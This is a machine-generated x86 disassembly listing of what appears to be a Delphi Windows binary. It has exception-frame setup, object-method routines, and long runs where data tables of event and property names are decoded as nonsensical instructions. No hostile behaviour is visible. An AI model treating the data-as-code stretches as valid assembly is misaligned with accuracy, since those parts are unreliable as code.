add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x4c0040 ] ch
add [ eax ] al
or [ ecx + ecx * 2 + 0x64 ] edx
push esp
push 0x64616572
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_468882
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xf ] 0x0
je r-xdata
push esp
je r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x68546449 ] bl
jb r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0xe ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
inc ecx
add [ eax + 0x29 ] ch
inc eax
add [ 0x42644954 ] cl
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ esi - 0x5857ffbf ] cl
outsd
jb r-xdata
cmpsd [ esi ] [ edi ]
popad
push esp
jb r-xdata
mov eax ebx
call sub_41a9d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468889
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
mov eax ebx
call sub_41a9a8
js r-xdata
add ah dh
cmpsb [ esi ] [ edi ]
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
mov [ esi - 0x5857ffbf ] fs
inc eax
add [ eax - 0x79 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x79 ] ah
inc esi
add [ eax ] al
add [ eax ] al
test [ eax ] ch
inc ecx
add [ ebx + esi + 0x40 ] ch
push 0x64616572
mov eax eax
mov esp 0x4687
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
xchg [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or cl [ eax + 0x680046 ]
add [ eax ] al
or al 0x87
inc esi
add [ ebx + esi + 0x40 ] ch
add ah dh
cmpsb [ esi ] [ edi ]
inc ecx
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
movsb [ edi ] [ esi ]
mov al [ esi ]
test al 0xa7
inc ecx
add [ eax - 0x6bffb978 ] ah
mov [ esi ] al
pushfd
mov [ esi ] al
cwde
push esp
push edi
popad
imul esi [ esi + eax * 2 + 0x6f ] r-xdata
pop eax
xchg [ esi ] eax
imul ebp [ esi + 0x61 ] 0x6e416574
sub_4688a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_4036f0#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4689ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_468ba4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4689b5
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc ]
retn
xor eax eax
push ebp
push sub_468984
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_468967
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_468ba4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_468ba4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46896e
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8 ]
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_41a924
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
sub_468a0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] bl
mov dl 0x1
mov eax [ r-xdata ]
call sub_428118
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] eax
xor eax eax
push ebp
push j_sub_4035c4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a5bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
add esp 0xfffffff0
call sub_403448
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_468aa4
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov [ esi + 0xf ] 0x0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a68c
mov eax esi
mov edx [ eax ]
call [ edx + 0x18 ]
lea eax [ esi + 0x44 ]
call sub_40d1c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_468adc
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4281a0
xor eax eax
push ebp
push sub_468b32
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_468ba4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b39
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4281a8
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x0
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_41a924
sub_468b3c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4281a0
xor eax eax
push ebp
push sub_468b9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_468ba4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ba1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4281a8
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x48 ]
sub al 0x1
jae r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x49 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_468ba4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov [ ebp - 0x5 ] 0x1
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
call sub_4281a0
xor eax eax
push ebp
push sub_468c07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x49 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xe ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x5 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
call sub_4281a8
retn
sub_468c74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468c99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468ca0
retn
sub_46a2f1
cmp [ esi ] al
sub [ esi + 0x46 ] ch
add [ esp + esi * 2 + 0x6b040046 ] ch
inc esi
add [ ebx + ebp * 2 + 0x7bcc0046 ] ch
inc esi
add [ ebp + edi * 2 + 0x6c800046 ] bl
inc esi
add al dh
insd
inc esi
add [ eax ] cl
jpo r-xdata
add [ eax + edx + 0xe80040 ] ch
add [ eax ] al
lodsb [ esi ]
add [ eax + 0x6e ] cl
inc esi
add al dl
outsb
inc esi
add [ eax + 0x6e ] dh
inc esi
add [ edi + ebp * 2 ] dh
inc esi
add al ah
jno r-xdata
add al dh
add [ eax ] al
add al al
je r-xdata
add [ eax + edx + 0xf40040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
clc
add [ eax ] al
add [ ebp + esi * 2 + 0x79200046 ] al
inc esi
add [ eax - 0x47ffb987 ] al
ja r-xdata
add [ eax + edx + 0xfc0040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc [ ecx ] al
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
int3
adc [ eax ] al
in al dx
add [ eax ] al
add [ eax + edx + 0xf00040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
hlt
add al ch
test [ esi ] eax
add [ esi - 0x7a37ffba ] al
inc esi
add [ edi + edi * 4 ] ch
inc esi
add [ eax * 4 + 0xe0046 ] cl
add [ eax ] al
add [ eax ] al
or eax 0xac000000
adc [ eax ] al
call 0xffffffffac46a367
sub_46a437
mov esp 0x10046c6
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x55080016 ] al
jae r-xdata
jae r-xdata
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08001c ] al
outsb
dec esi
outsd
je r-xdata
outsd
jb r-xdata
add bh bh
or al cl
inc esi
add [ ecx ] al
popad
insd
lodsb [ gs : esi ]
adc [ eax ] al
hlt
arpl [ edi + 0x6e ] bp
outsb
arpl [ gs : eax - 0x6d ] si
arpl [ ebp - 0x14 ] sp
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x52070019 ] al
jo r-xdata
sbb al 0x91
inc esi
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
enter 0x46 0x1
xchg edx eax
inc esi
in al dx
imul esp [ ebp + 0x73 ] r-xdata
add [ ecx ] al
add bh bh
fadd st7
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5508001a ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0026 ] al
pushad
xchg esp eax
inc esi
add [ eax + 0x1 ] bl
add bh bh
pop eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080023 ] al
outsb
push eax
popad
jb r-xdata
inc esi
add [ eax + 0x1 ] al
add bh bh
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060020 ] al
outsb
dec edx
outsd
imul ebp [ esi - 0x44 ] 0x48004693
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] eax
or [ edi + 0x6e ] cl
dec edx
outsd
imul ebp [ esi + 0x65 ] 0x46940464
add [ eax + 0x1 ] dl
add bh bh
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060022 ] al
outsb
push eax
popad
jb r-xdata
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi + ecx * 2 ] cl
outsb
inc esp
imul esi [ ebx + 0x63 ] 0x656e6e6f
arpl [ eax - 0x6d ] si
popad
in al dx
xchg edx eax
inc esi
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] cl
dec edi
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov [ 0x1300041 ] dl
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ ecx ] cl
dec edi
outsb
inc ebx
outsd
outsb
outsb
arpl [ gs : eax + ecx * 4 + 0x15 ] si
inc ecx
add [ eax ] bh
add [ eax ] eax
jb r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0027 ] al
outsb
dec esi
imul esp [ ebx + 0x6b ] 0x6e616843
fcom [ fs : di + 0x46 ]
add [ ecx ] 0x0
inc [ eax + 0x1ff0001 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070028 ] al
outsb
push esp
outsd
jo r-xdata
add bh bh
test al 0x94
inc esi
add [ eax + 0x1 ] ah
add bh bh
pushad
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060024 ] al
outsb
dec ebx
imul esp [ ebx + 0x6b ] r-xdata
push 0x68ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080025 ] al
outsb
dec ebx
imul esp [ ebx + 0x6b ] 0x957c6465
inc esi
add [ eax + 0x1 ] dh
add bh bh
jo r-xdata
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsd
in al dx
xchg edx eax
inc esi
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09001b ] al
outsb
dec ebp
jae r-xdata
inc ecx
add [ eax - 0x5f00ffff ] ah
add [ eax ] eax
inc [ ecx ]
arpl [ eax - 0x6a ] sp
inc esi
add [ eax - 0x7700ffff ] cl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060029 ] al
outsb
push ecx
jne r-xdata
inc [ ecx ]
outsb
dec esi
imul esp [ ebx + 0x6b ] 0x6e616843
dec esp
lahf
inc esi
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edi + ecx * 2 ] cl
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
outsd
jb r-xdata
xchg edi eax
inc esi
add [ eax - 0x5700ffff ] ch
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002d ] al
outsb
inc ebp
jb r-xdata
outsb
pop eax
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060035 ] al
outsb
inc esp
outsd
jo r-xdata
pop eax
cwde
inc esi
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080032 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a002c ] al
outsb
push eax
imul ebp [ esi + 0x67 ] 0x676e6f50
pop eax
mov al [ 0x1ff0001 ]
xchg edi eax
inc esi
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002e ] al
outsb
inc ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ 0x694e6e4f ] cl
arpl [ ebx + 0x43 ] bp
push 0x65676e61
fcom [ fs : ebp + 0x1800046 ]
add bh bh
add [ ecx ] 0x0
inc [ ecx ]
xchg esi eax
inc esi
add [ eax - 0x6f00ffff ] dl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07002a ] al
outsb
dec esi
popad
insd
jae r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f040034 ] al
outsb
dec edi
jo r-xdata
cdq
inc esi
add al dh
add [ eax ] eax
outsb
rcr [ ecx + 0x1f80046 ] 0x1
add bh bh
clc
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070037 ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : 0x61426e4f ] al
je r-xdata
push edi
popad
insb
insb
outsd
jo r-xdata
add [ ecx ] cl
jns r-xdata
xchg edi eax
inc esi
add [ eax - 0x6700ffff ] bl
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08002b ] al
outsb
dec ecx
outsb
jbe r-xdata
outsb
push ebp
outsb
bound esp [ ecx + 0x6e ]
pop esp
cdq
inc esi
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070038 ] al
outsb
push esi
outsd
imul esp [ ebx + 0x65 ] r-xdata
or [ edx ] al
add bh bh
or [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
inc esp
jbe r-xdata
cdq
inc esi
add al ch
add [ eax ] eax
add [ eax ] al
cmp [ eax + eax ] 0xa
dec edi
outsb
imul esp [ ebx + 0x65 ] r-xdata
adc [ edx ] al
add bh bh
adc [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or eax 0x68436e4f
popad
outsb
outsb
insb
dec ebp
outsd
int3
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f050036 ] al
outsb
[ eax ] eax
insd
fcomp [ eax + 0x1d80046 ]
add bh bh
fadd [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
add eax 0x61526e4f
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002f ] al
outsb
dec esi
outsd
ja r-xdata
lahf
inc esi
add [ eax - 0x4700ffff ] bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003f ] al
outsb
dec ebx
jb r-xdata
inc edx
popad
cdq
inc esi
add al ah
add [ eax ] eax
jmp eax
dec edi
ja r-xdata
ja r-xdata
mov [ 0x1a00041 ] dl
add bh bh
add [ eax ] al
add [ eax + eax + 0x6 ] 0x4f
outsb
push ebx
outsb
int3
jb r-xdata
outsb
jbe r-xdata
outsd
mov [ gs : 0x2280041 ] dl
add bh bh
sub [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f1100
push ebp
jae r-xdata
outsb
push ebx
jns r-xdata
add [ eax ] cl
dec edi
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
inc esp
popfd
inc esi
add [ eax + 0x2 ] dl
add bh bh
push eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
outsb
inc ebx
push esp
inc ebx
push eax
push edx
jo r-xdata
outsb
inc ebx
push esp
inc ebx
push eax
push ecx
jne r-xdata
add [ ebx ] cl
je r-xdata
outsb
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
inc ebx
outsd
insd
insd
popad
outsb
test al 0x9c
inc esi
add [ eax + 0x2 ] cl
add bh bh
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
add [ eax ] 0x0
add [ eax + 0x4f100040 ] al
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
push ebp
outsb
inc ecx
ja r-xdata
lahf
inc esi
add al al
add [ eax ] eax
inc eax
add [ eax + 0x4f090048 ] al
outsb
dec esi
outsd
push esp
outsd
jo r-xdata
or al 0x9e
inc esi
add [ eax + 0x2 ] dh
add bh bh
jo r-xdata
jbe r-xdata
jns r-xdata
dec edi
outsb
int3
imul ebp [ esp + ebp * 2 + 0x34 ] 0x4000469c
add al [ eax ]
inc [ eax + 0x2 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ eax ] dl
dec edi
outsd
inc ebx
push 0x65676e61
js r-xdata
ja r-xdata
add [ 0x61526e4f ] al
jns r-xdata
push edx
jae r-xdata
arpl [ edi + ebx * 4 + 0x2880046 ] dx
add bh bh
mov [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec ecx
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
add [ edi + ecx * 2 ] cl
add bh bh
xor al 0x9c
inc esi
add [ eax + 0x2 ] al
add bh bh
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x2580041
add bh bh
pop eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0043 ] al
outsb
push ebx
je r-xdata
push ebp
jae r-xdata
inc ebx
push 0x656e6e61
insb
dec ebp
outsd
inc ebx
push 0x65676e61
cmp [ fs : ebx + 0x2200046 ] bl
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc esi
add [ eax ] dh
add al [ eax ]
push [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ecx
outsb
cwde
inc esi
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090031 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ edi ] cl
dec edi
outsb
inc ebx
push 0x656e6e61
insb
push ebp
jo r-xdata
insd
add [ gs : ecx + 0x2a00046 ] ah
add bh bh
mov al [ 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004c ] al
outsb
inc esp
inc ebx
inc ebx
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
add [ ecx ] cl
dec edi
outsb
push eax
sahf
inc esi
add [ eax + 0x2 ] bh
add bh bh
js r-xdata
outsb
dec esi
imul esp [ ebx + 0x6b ] 0x556e4973
jae r-xdata
add [ eax ] al
add [ eax + 0x4f0c0046 ] al
je r-xdata
popad
je r-xdata
add [ eax + 0x52 ] dl
dec ecx
push esi
dec ebp
push ebx
inc edi
add bh bh
and [ ecx + 0x2a80046 ] 0x0
[ eax + 0x1ff0002 ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edi
add [ 0x6f536e4f ] cl
arpl [ ebx + 0x65 ] bp
je r-xdata
add bh bh
or al 0x4f
inc ebx
push 0x65676e61
int3
add [ eax ] al
add [ esi + 0x49 ] cl
inc ebx
dec ebx
add [ eax ] al
add [ eax ] al
inc esp
inc ebx
inc ebx
inc ebx
push 0x9ff47461
inc esi
add [ eax - 0x6f00fffe ] dl
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004a ] al
outsb
inc esp
inc ebx
inc ebx
push ebx
outsb
and [ fs : eax + 0x2980046 ] 0x0
jb r-xdata
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b004b ] al
outsb
inc esp
inc ebx
inc ebx
cwde
add al [ eax ]
outsd
jb r-xdata
outsb
push edx
arpl [ gs : ebp + 0x69 ] sp
sahf
inc esi
add [ eax - 0x7f00fffe ] al
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sub_46ae2c
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
call sub_4043a8
mov eax [ ebp + 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46aeb9
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ esi + 0x2e4 ]
xor edx edx
mov eax edi
call sub_414a74
mov [ edi + 0xc ] esi
lea eax [ edi + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_403f4c
lea eax [ edi + 0x14 ]
mov edx [ ebp + 0x8 ]
call sub_403f4c
xor eax eax
mov [ edi + 0x18 ] eax
lea eax [ edi + 0x1c ]
call sub_403ef8
mov [ edi + 0x20 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aec0
lea eax [ ebp + 0x8 ]
mov edx 0x2
call sub_403f1c
retn
add esp 0xfffffff0
call sub_403448
sub_46aee0
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414aac
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_46af08
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx [ r-xdata ]
xor edx edx
mov eax edi
call sub_414c58
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_46af4c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414ca4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_46af88
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4043a8
mov eax [ ebp - 0x8 ]
call sub_4043a8
xor eax eax
push ebp
push sub_46b029
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46b07c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebx + 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46ae2c
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_46af74
mov ebx eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc [ ebx + 0x20 ]
jmp r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_404304
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46b030
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f1c
retn
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_403f4c
sub_46b038
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
dec [ ebx + 0x20 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
pop edx
pop esi
pop ebx
retn
mov ecx esp
mov edx [ ebx + 0x10 ]
